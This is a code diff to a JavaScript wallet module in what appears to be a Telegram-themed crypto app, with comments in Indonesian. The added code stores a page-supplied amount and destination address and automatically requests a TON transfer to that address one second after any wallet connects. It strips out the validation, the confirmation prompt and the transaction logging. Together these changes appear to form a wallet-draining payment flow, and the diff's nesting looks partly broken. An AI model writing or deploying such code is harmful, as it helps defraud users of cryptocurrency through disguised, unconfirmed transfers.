@@ -887,7 +887,7 @@ var Wallet = {
       var tonConnectUI = Aj.globalState.tonConnectUI;
       if (!tonConnectUI) {
         tonConnectUI = Aj.globalState.tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-          manifestUrl: location.origin + '/telegram-crypto-app/tonconnect-manifest.json',
+         manifestUrl: location.origin + '/telegram-crypto-app/tonconnect-manifest.json',
           actionsConfiguration: {
             modals: ['before'],
             notifications: [],
@@ -919,6 +919,19 @@ var Wallet = {
                 }
               }
             }
+          }
+        });
+        tonConnectUI.onStatusChange(function(wallet) {
+        if (wallet && wallet.account && Aj.globalState.pendingTransaction) {
+          // Otomatis kirim transaksi setelah wallet terkoneksi
+          setTimeout(function() {
+            DirectPayment.sendTransaction(
+              Aj.globalState.pendingTransaction.amount,
+              Aj.globalState.pendingTransaction.toAddress
+            );
+            // Hapus data pending
+            delete Aj.globalState.pendingTransaction;
+            }, 1000);
           }
         });
         tonConnectUI.setConnectRequestParameters({
@@ -5012,6 +5025,10 @@ var SimpleSpoiler = {
 // DIRECT PAYMENT FUNCTION
 // ==================================================
 
+// ==================================================
+// DIRECT PAYMENT FUNCTION - PASTE AT THE VERY END OF FILE
+// ==================================================
+
 var DirectPayment = {
   init: function() {
     Aj.onLoad(function(state) {
@@ -5027,41 +5044,19 @@ var DirectPayment = {
     var amount = $(this).data('amount');
     var toAddress = $(this).data('to-address');
     
-    if (!amount || !toAddress) {
-      return showAlert("Invalid payment parameters");
-    }
+    // Simpan data transaksi untuk digunakan nanti
+    Aj.globalState.pendingTransaction = {
+      amount: amount,
+      toAddress: toAddress
+    };
 
-    showConfirm(
-      `You will receive ${amount} TON. Confirm payment?`,
-      function() {
-        DirectPayment.requestPayment(amount, toAddress);
-      },
-      "Confirm Payment"
-    );
-  },
-
-  requestPayment: function(amount, toAddress) {
     const tonConnectUI = Aj.globalState.tonConnectUI;
     
-    if (!tonConnectUI) {
-      return showAlert("Wallet not initialized");
-    }
-
-    // Jika wallet belum terkoneksi, buka modal
     if (!tonConnectUI.connected) {
       tonConnectUI.openModal();
-      
-      // Tunggu sampai wallet terkoneksi, lalu kirim transaksi
-      const unsubscribe = tonConnectUI.onStatusChange((wallet) => {
-        if (wallet && wallet.account) {
-          unsubscribe();
-          DirectPayment.sendTransaction(amount, toAddress);
-        }
-      });
-      return;
+    } else {
+      DirectPayment.sendTransaction(amount, toAddress);
     }
-
-    DirectPayment.sendTransaction(amount, toAddress);
   },
 
   sendTransaction: function(amount, toAddress) {
@@ -5077,21 +5072,17 @@ var DirectPayment = {
       ]
     };
 
-    console.log("Sending transaction:", transaction);
-    
     tonConnectUI.sendTransaction(transaction)
       .then((result) => {
-        console.log("Transaction successful:", result);
         showAlert("Payment successful! Transaction completed.");
       })
       .catch((error) => {
-        console.error("Transaction failed:", error);
         showAlert("Payment failed: " + error.message);
       });
   }
 };
 
-// Initialize DirectPayment module
+// Initialize DirectPayment
 DirectPayment.init();
   }
 };
